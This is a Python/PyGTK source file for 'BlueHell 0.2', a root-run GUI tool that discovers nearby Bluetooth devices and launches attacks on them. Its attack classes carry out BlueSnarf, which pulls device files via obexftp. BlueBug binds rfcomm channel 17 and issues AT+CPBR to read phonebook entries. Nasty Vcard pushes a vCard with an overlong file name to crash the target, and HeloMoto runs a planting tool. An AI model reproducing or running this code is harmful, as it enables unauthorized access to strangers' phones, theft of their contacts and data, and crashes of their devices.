import time
import datetime
import struct
import sys
import os
import re
import string
import serial
import threading
import lightblue
import bluetooth
import _bluetooth as _bt
import pygtk
pygtk.require('2.0')
import gtk

class WReports:
    def aggiorna_text_view(self,treeview,path,column):
        selection = treeview.get_selection()
        result = selection.get_selected()
        model, iter = result
        if iter:
            report = model.get_value(iter,0)
            buffer = open("reports/" + report,"r")
            self.dialog.textbuffer.set_text(buffer.read())
            buffer.close()

    def destroy( self ):
        self.dialog.destroy()
        del self.dialog

    def run( self ):
        self.dialog.show_all()
        self.dialog.run()
        
    def __init__(self,parent): 
        blueHellicon = 'images/blueHell.png'
        self.parent = parent
        self.dialog = gtk.Dialog('Action...',self.parent.window,gtk.DIALOG_MODAL | gtk.DIALOG_DESTROY_WITH_PARENT,(gtk.STOCK_CANCEL,gtk.RESPONSE_REJECT ))
        self.dialog.set_transient_for( self.parent.window )
        self.dialog.set_size_request( 600, 500)
     
        self.dialog.pstore = gtk.ListStore(str)
        self.dialog.plist = gtk.TreeView(self.dialog.pstore)
        self.dialog.plist.connect('row-activated',self.aggiorna_text_view)

        self.dialog.REPcol = gtk.TreeViewColumn("Reports")
	self.dialog.REPcol.set_sort_column_id(0)
	self.dialog.plist.append_column(self.dialog.REPcol)
        
        self.dialog.sw1 = gtk.ScrolledWindow()
        self.dialog.sw1.set_policy(gtk.POLICY_AUTOMATIC,gtk.POLICY_ALWAYS)
        
        self.dialog.cellREP=gtk.CellRendererText()
        self.dialog.REPcol.pack_start(self.dialog.cellREP, True)
        self.dialog.REPcol.set_attributes(self.dialog.cellREP,text=0)
        
        self.dialog.sw1.add(self.dialog.plist)
        
        self.dialog.sw = gtk.ScrolledWindow()
        self.dialog.sw.set_policy(gtk.POLICY_AUTOMATIC,gtk.POLICY_ALWAYS)
        
        self.dialog.detail = gtk.TextView()
        self.dialog.textbuffer = self.dialog.detail.get_buffer()
        
        self.dialog.detail.set_editable(False)
        self.dialog.detail.set_cursor_visible(False)
        
        self.dialog.sw.add(self.dialog.detail)
        
        self.dialog.vbox.pack_start(self.dialog.sw,True,True,4)
        self.dialog.vbox.pack_start(gtk.HSeparator(),False,False,0)
        self.dialog.vbox.pack_start(self.dialog.sw1,False,False,4)
        
        for root, dirs, files in os.walk("reports"):
            for entry in files:
                self.dialog.pstore.append([entry])
        
        if files:
            primo = self.dialog.pstore['0'] [0]
            buffer = open("reports/" + primo,"r")
            self.dialog.textbuffer.set_text(buffer.read())
            buffer.close()

class HeloMoto(threading.Thread):
    def __init__(self,main,bt_addr):
        self.main=main
        self.bt_addr=bt_addr
        threading.Thread.__init__(self)
	
    def run(self):
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)

        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)
	
	helomotoCMD = "tools/helomoto/helomoto -i hci0 plant " + self.bt_addr
        stdout = os.popen(helomotoCMD)
        status = stdout.read()
	id = self.main.lastattackbar.get_context_id("HeloMoto")
	
	report = open("reports/" + datetime.datetime.now().strftime("Helomoto attack date: %d-%m-%Y time: %H-%M-%S"),"w")
	
	if len(status) > 0:
		self.main.lastattackbar.push(id,"Device " + self.bt_addr + " is not vulnerable to Helomoto bug")
		report.write("Device " + self.bt_addr + " is not vulnerable to Helomoto bug")
        else:
		self.main.lastattackbar.push(id,"Device " + self.bt_addr + " is vulnerable to Helomoto bug")
		report.write("Device " + self.bt_addr + " is vulnerable to Helomoto bug")
	
	report.close()
	
        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)


class Nasty_Vcard(threading.Thread):
    def __init__(self,main,bt_addr):
        self.main=main
        self.bt_addr=bt_addr
        threading.Thread.__init__(self)
	
    def run(self):
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)

        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)

        selection = self.main.plist.get_selection()
        result = selection.get_selected()
        model, iter = result
            
        iternext =  self.main.pstore.iter_children(iter)
        id = self.main.lastattackbar.get_context_id("NastyVcard")
	
        while iternext:
            service = model.get_value(iternext,0)
            if string.find(service,"Object Push") <> -1:
		inetnextnext = self.main.pstore.iter_children(iternext)
		while inetnextnext:
			port = model.get_value(inetnextnext,0)
			if string.find(port,"Channel/PSM:") <> -1:
				report = open("reports/" + datetime.datetime.now().strftime("Nasty VCard attack date: %d-%m-%Y time: %H-%M-%S"),"w")
				try:
					lightblue.obex.sendfile(self.bt_addr,int(port[12:]),'vcards/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.vcf')
				    	self.main.lastattackbar.push(id,"VCard Sent to " + self.bt_addr)    
					report.write("VCard Sent to " + self.bt_addr)
                		except IOError:
                			self.main.lastattackbar.push(id,"Error sending VCard to " + self.bt_addr)    
					report.write("Error sending VCard to " + self.bt_addr)
				break
				report.close()
			inetnextnext = self.main.pstore.iter_next(inetnextnext)
		break
            iternext =  self.main.pstore.iter_next(iternext)
        
        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)
		

class Blue_Bug(threading.Thread):
    def __init__(self,main,bt_addr):
        self.main=main
        self.bt_addr=bt_addr
        threading.Thread.__init__(self)
	
    def run(self):
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)
        
        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)
	
	if not os.path.exists("/dev/rfcomm0"):
		dev = os.spawnlp(os.P_WAIT,'mknod','mknod','/dev/rfcomm0','c','216','0')		
	pid = os.spawnlp(os.P_WAIT,'rfcomm','rfcomm','bind','0', self.bt_addr ,'17')
	id = self.main.lastattackbar.get_context_id("BlueBug")
		
	report = open("reports/" + datetime.datetime.now().strftime("BlueBug attack date: %d-%m-%Y time: %H-%M-%S"),"w")
		
	if pid==0:
		self.main.lastattackbar.push(id,"Binding to channel 17 on " + self.bt_addr)
		report.write("Binding to channel 17 on " + self.bt_addr + "\n")
		try:
	                blue_serial = serial.Serial('/dev/rfcomm0',19200,timeout=1)
        	        blue_serial.write('AT+CPBR=1,100\r\n')
                	line=blue_serial.read(50)
			self.main.lastattackbar.push(id,"BluBug response: " + line)
			report.write("BluBug response: " + line + "\n")
                	blue_serial.close()
            	except Exception:
                	self.main.lastattackbar.push(id,"Error Bluebugging %s (channel 17)" % (self.bt_addr))
			report.write("Error Bluebugging %s (channel 17)" % (self.bt_addr) + "\n")
            	pid = os.spawnlp(os.P_WAIT,'rfcomm','rfcomm','release','0')
	else:
		self.main.lastattackbar.push(id,"Error binding to channel 17 on " + self.bt_addr )
		report.write("Error binding to channel 17 on " + self.bt_addr + "\n")
 
 	report.close()
 
        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)
 

class Blue_Snarf(threading.Thread):
    def __init__(self,main,bt_addr):
        self.main=main
	self.bt_addr=bt_addr
        threading.Thread.__init__(self)
    
    def run(self):
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)
        
        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)
        
        selection = self.main.plist.get_selection()
        result = selection.get_selected()
        model, iter = result
            
        iternext =  self.main.pstore.iter_children(iter)
        
        while iternext:
            service = model.get_value(iternext,0)
            if string.find(service,"Object Push") <> -1:
		inetnextnext = self.main.pstore.iter_children(iternext)
		while inetnextnext:
			port = model.get_value(inetnextnext,0)
			if string.find(port,"Channel/PSM:") <> -1:
				tmp = os.getcwd()
				if not os.path.exists(self.bt_addr):
					os.mkdir(self.bt_addr)
				else:
					os.rmdir(self.bt_addr)
					os.mkdir(self.bt_addr)
				os.chdir(self.bt_addr)
                		BlueSnarfCmd = "obexftp -b " + self.bt_addr + " -B " + port[12:].strip()  + " -g telecom/devinfo.txt"
                		stdout = os.popen(BlueSnarfCmd)
                		status = stdout.read()
				result=status.splitlines()
				id = self.main.lastattackbar.get_context_id("BlueSnarf")
				self.main.lastattackbar.push(id,"check /" + self.bt_addr + " for BlueSnarf results!")
				os.chdir(tmp)
				report = open("reports/" + datetime.datetime.now().strftime("BlueSnarf attack %d-%m-%Y time: %H-%M-%S"),"w")
				report.write("check /" + self.bt_addr + " for BlueSnarf results!")
				report.close()
				break
			inetnextnext = self.main.pstore.iter_next(inetnextnext)
		break
            iternext =  self.main.pstore.iter_next(iternext)
        
        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)
        
class Find_Services(threading.Thread):
    def __init__(self,main,bt_addr):
        self.main=main
        self.bt_addr=bt_addr
        threading.Thread.__init__(self)
        
    def run(self):
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)
        
        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)
        
        services = bluetooth.find_service(address=self.bt_addr)

        selection = self.main.plist.get_selection()
        result = selection.get_selected()
        model, iter = result
        
        iternext =  self.main.pstore.iter_children(iter)
        
        while iternext:
                self.main.pstore.remove(iternext)
                iternext =  self.main.pstore.iter_children(iter)
        
	report = open("reports/" + datetime.datetime.now().strftime("Services activity on " + self.bt_addr + " date: %d-%m-%Y time: %H-%M-%S"),"w")
	report.write(self.bt_addr + "\n")
	
        if len(services) == 0:
            piter1 = self.main.pstore.append(iter,["No services found!"])
	    report.write("No services found!\n")

        for svc in services:
            piter1 = self.main.pstore.append(iter,['Service Name: %s' % svc["name"]])
	    report.write("\t" + 'Service Name: %s' % svc["name"] + "\n")
            piter2 = self.main.pstore.append(piter1,['Description: %s' % svc["description"]])
	    report.write("\t" + 'Description: %s' % svc["description"] + "\n")
            piter3 = self.main.pstore.append(piter1,['Provided by: %s' % svc["provider"]])
	    report.write("\t" + 'Provided by: %s' % svc["provider"] + "\n")
            piter4 = self.main.pstore.append(piter1,['Protocol: %s' % svc["protocol"]])
	    report.write("\t" + 'Protocol: %s' % svc["protocol"] + "\n")
            piter5 = self.main.pstore.append(piter1,['Channel/PSM: %s' % svc["port"]])
	    report.write("\t" + 'Channel/PSM: %s' % svc["port"] + "\n\n")

	report.close()

        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)
 
class  Find_Devices(threading.Thread):
    def __init__(self,main):
        self.main=main
        threading.Thread.__init__(self)
        
    def run(self):
        self.main.pstore.clear()
        self.main.scan_button.set_sensitive(False)
	self.main.fingerprint_button.set_sensitive(False)
        self.main.services_button.set_sensitive(False)
        self.main.attack_button.set_sensitive(False)
        self.main.reports_button.set_sensitive(False)
        self.main.close_button.set_sensitive(False)
        
        gdkwin = self.main.window
        cursor = gtk.gdk.Cursor(gtk.gdk.PIRATE)
        gdkwin.window.set_cursor(cursor)
        nearby_devices = bluetooth.discover_devices(lookup_names = True)
        
	
	report = open("reports/" + datetime.datetime.now().strftime("Scan activity date: %d-%m-%Y time: %H-%M-%S"),"w")
	
        for name,addr in nearby_devices:
            piter1=self.main.pstore.append(None,[addr])
	    report.write(addr + "\n")
            piter2=self.main.pstore.append(piter1,[name])
	    report.write("\t" + name + "\n")
	    
	report.close()
	
        self.main.scan_button.set_sensitive(True)
	self.main.fingerprint_button.set_sensitive(True)
        self.main.services_button.set_sensitive(True)
        self.main.attack_button.set_sensitive(True)
        self.main.reports_button.set_sensitive(True)
        self.main.close_button.set_sensitive(True)
        
        gdkwin.window.set_cursor(None)
        
class Main:
    DEV_BLUE = False
    
    def reports(self, widget,data=None):
    	go = WReports(self)
        ok = go.run()
        go.destroy()
        
    
    def button_press(self, widget, event):
        if event.type == gtk.gdk.BUTTON_PRESS:
            widget.popup(None, None, None, event.button, event.time)
            return True
        return False
    
    def attacking(self,widget,string):
        if self.DEV_BLUE:
            selection = self.plist.get_selection()
            result = selection.get_selected()
            model, iter = result
            if iter:
                bt_addr = model.get_value(iter,0)
                ok = re.compile('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w')
                if ok.search(bt_addr):
                    if string.find("Blue Snarf") <> -1:
                        bs = Blue_Snarf(self,bt_addr)
                        bs.start()
		    if string.find("Blue Bug") <> -1:
			bb = Blue_Bug(self,bt_addr)
			bb.start()
		    if string.find("Nasty Vcard") <> -1:
			nv = Nasty_Vcard(self,bt_addr)
			nv.start()
		    if string.find("HeloMoto") <> -1:
			hm = HeloMoto(self,bt_addr)
			hm.start()
                else:
                    msgbox = gtk.MessageDialog(self.window,gtk.DIALOG_MODAL,gtk.MESSAGE_INFO,gtk.BUTTONS_CLOSE,"Please choose a bluetooth address to attack!")
                    msgbox.show()
                    response = msgbox.run()
                    if response == gtk.RESPONSE_CLOSE:
                     msgbox.destroy()

    def fingerprinting(self,widget,data=None):
	if self.DEV_BLUE:
            selection = self.plist.get_selection()
            result = selection.get_selected()
            model, iter = result
            if iter:
                bt_addr = model.get_value(iter,0)
		bt_addr_ok = bt_addr[0:17]
                ok = re.compile('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w')
                if ok.search(bt_addr):
			blueprintCMD = "sdptool browse --tree --l2cap " + bt_addr_ok + " | tools/blueprint/bp.pl " + bt_addr_ok  
                        stdout = os.popen(blueprintCMD)
                        status = stdout.read()
                        fingerprint=status.splitlines()
                        model.set_value(iter,0,bt_addr_ok + "<>" + fingerprint[1])
		else:
                    msgbox = gtk.MessageDialog(self.window,gtk.DIALOG_MODAL,gtk.MESSAGE_INFO,gtk.BUTTONS_CLOSE,"Please choose a bluetooth address to fingerprint!")
                    msgbox.show()
                    response = msgbox.run()
                    if response == gtk.RESPONSE_CLOSE:
                    	msgbox.destroy()
            
    def scanning(self,widget,data=None):
        if self.DEV_BLUE:
            fd = Find_Devices(self)
            fd.start()
    def services(self,widget,data=None):
        if self.DEV_BLUE:
            selection = self.plist.get_selection()
            result = selection.get_selected()
            model, iter = result
            if iter:
                bt_addr = model.get_value(iter,0)
                ok = re.compile('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w')
                if ok.search(bt_addr):
                    fs = Find_Services(self,bt_addr)
                    fs.start()
                else:
                    msgbox = gtk.MessageDialog(self.window,gtk.DIALOG_MODAL,gtk.MESSAGE_INFO,gtk.BUTTONS_CLOSE,"Please choose a bluetooth address to find services!")
                    msgbox.show()
                    response = msgbox.run()
                    if response == gtk.RESPONSE_CLOSE:
                        msgbox.destroy()
            
    def get_local_bdaddr(self):
        id = self.statusbar.get_context_id("device_info")
        try:
            hci_sock = _bt.hci_open_dev()
            old_filter = hci_sock.getsockopt( _bt.SOL_HCI, _bt.HCI_FILTER, 14)
            flt = _bt.hci_filter_new()
            opcode = _bt.cmd_opcode_pack(_bt.OGF_INFO_PARAM, 
                    _bt.OCF_READ_BD_ADDR)
            _bt.hci_filter_set_ptype(flt, _bt.HCI_EVENT_PKT)
            _bt.hci_filter_set_event(flt, _bt.EVT_CMD_COMPLETE);
            _bt.hci_filter_set_opcode(flt, opcode)
            hci_sock.setsockopt( _bt.SOL_HCI, _bt.HCI_FILTER, flt )
        
            _bt.hci_send_cmd(hci_sock, _bt.OGF_INFO_PARAM, _bt.OCF_READ_BD_ADDR )
        
            pkt = hci_sock.recv(255)
        
            status,raw_bdaddr = struct.unpack("xxxxxxB6s", pkt)
            assert status == 0
        
            t = [ "%02X" % ord(b) for b in raw_bdaddr ]
            t.reverse()
            bdaddr = ":".join(t)
            # restore old filter
            hci_sock.setsockopt( _bt.SOL_HCI, _bt.HCI_FILTER, old_filter )
            self.statusbar.push(id,"Local bt device address: %s"  % (bdaddr))
            self.DEV_BLUE = True
        except:
            self.statusbar.push(id,"No local bt device found!")

    def __init__(self):
        title = 'BlueHell 0.2 [[[ public ]]] version'
        BlueHellicon = "icon/blueHell.png"
        ScanIcon = "icon/scan.png"
	FingerprintIcon = "icon/fingerprint.png"
        ServicesIcon = "icon/services.png"
        AttackIcon = "icon/attack.png"
        ReportsIcon = "icon/reports.png"
        ExitIcon = "icon/exit.png"
        
        # are you root?
        if os.getuid() !=0:
            print "sorry, you need to run this as root!"
            sys.exit(0)
        
        self.stop = False
        self.window = gtk.Dialog('foo', None, gtk.DIALOG_MODAL ) 
        self.window.set_title(title)
        self.window.set_border_width(10)
        
        icon = gtk.gdk.pixbuf_new_from_file(BlueHellicon)
        
        self.window.set_icon(icon)
        self.window.set_size_request( 800, 600 )                
                
        self.pstore = gtk.TreeStore(str)
                
        self.plist = gtk.TreeView(self.pstore)
        self.IDcol = gtk.TreeViewColumn("Devices")
                
        self.plist.append_column(self.IDcol)
                
        self.cellID=gtk.CellRendererText()
                
        self.IDcol.pack_start(self.cellID, True)
        self.IDcol.set_attributes(self.cellID, text=0)
                
        sb = gtk.VScrollbar(self.plist.get_vadjustment())
        sb.show()
                
        self.plist.show()
        
        self.image = gtk.Image()
        self.image.set_from_file(ScanIcon)
        
        self.scan_button = gtk.Button("Scan")
        self.scan_button.set_image(self.image)
        self.scan_button.connect("clicked",self.scanning)
        self.scan_button.show()    

	self.image = gtk.Image()
	self.image.set_from_file(FingerprintIcon)

	self.fingerprint_button = gtk.Button("Fingerprint")
	self.fingerprint_button.set_image(self.image)
        self.fingerprint_button.connect("clicked",self.fingerprinting)
        self.fingerprint_button.show()    

        self.image = gtk.Image()
        self.image.set_from_file(ServicesIcon)
        
        self.services_button = gtk.Button("Services")
        self.services_button.set_image(self.image)
        self.services_button.connect("clicked",self.services)
        self.services_button.show()    
        
        self.menu = gtk.Menu()
        self.attacks = "Blue Snarf"
        self.menu_items = gtk.MenuItem(self.attacks)
        self.menu.append(self.menu_items)
        
        self.menu_items.connect("activate", self.attacking,self.attacks)
        self.menu_items.show()
        
        self.attacks = "Blue Bug"
        self.menu_items = gtk.MenuItem(self.attacks)
        self.menu.append(self.menu_items)
        
        self.menu_items.connect("activate", self.attacking,self.attacks)
        self.menu_items.show()
        
        self.attacks = "HeloMoto"
        self.menu_items = gtk.MenuItem(self.attacks)
        self.menu.append(self.menu_items)
        
        self.menu_items.connect("activate", self.attacking,self.attacks)
        self.menu_items.show()

        self.attacks = "Nasty Vcard"
        self.menu_items = gtk.MenuItem(self.attacks)
        self.menu.append(self.menu_items)
        
        self.menu_items.connect("activate", self.attacking,self.attacks)
        self.menu_items.show()
        
        self.image = gtk.Image()
        self.image.set_from_file(AttackIcon)        
        
        self.attack_button = gtk.Button("Attack")
        self.attack_button.set_image(self.image)
        self.attack_button.connect_object("event", self.button_press, self.menu)    
        
        self.image = gtk.Image()
        self.image.set_from_file(ReportsIcon)
        
        self.reports_button = gtk.Button("Reports")
        self.reports_button.set_image(self.image)
	self.reports_button.connect("clicked",self.reports)
        self.reports_button.show()    
        
        self.image = gtk.Image()
        self.image.set_from_file(ExitIcon)
        
        self.close_button = gtk.Button("Close")
        self.close_button.set_image(self.image)
        self.close_button.connect_object("clicked",gtk.Widget.destroy,self.window)
        self.close_button.show()    
                
        self.statusbar = gtk.Statusbar()
        self.get_local_bdaddr()
        self.statusbar.show()

        self.lastattackbar = gtk.Statusbar()
        self.lastattackbar.show()
        
        rows = gtk.VBox(False,3)
        listcols = gtk.HBox(False,0)
        prows = gtk.VBox(False,0)
                
        rows.pack_start(listcols,True,True,0)
        rows.pack_start(self.lastattackbar,False,True,0)
        rows.pack_start(self.statusbar,False,True,0)
        
        listcols.pack_start(self.plist,True,True,0)
        listcols.pack_start(sb,False,False,0)
        listcols.pack_start(prows,False,False,5)
        
        prows.pack_start(self.scan_button,False,False,2)
        prows.pack_start(self.fingerprint_button,False,False,2)
        prows.pack_start(self.services_button,False,False,2)
        prows.pack_start(self.attack_button,False,False,2)
        prows.pack_start(self.reports_button,False,False,2)
        prows.pack_start(self.close_button,False,False,2)
        
        rows.show()
        listcols.show()
        prows.show()
        
        self.window.vbox.add( rows )
        self.window.vbox.set_spacing( 3 )

        self.window.show_all()
        self.window.connect('destroy',self.exit)
        self.main_loop()

    def exit(self, arg):
        self.stop=True

    def main_loop(self):
        while not self.stop:
            while gtk.events_pending():
                gtk.main_iteration()
                time.sleep(0.01)
        
Main()
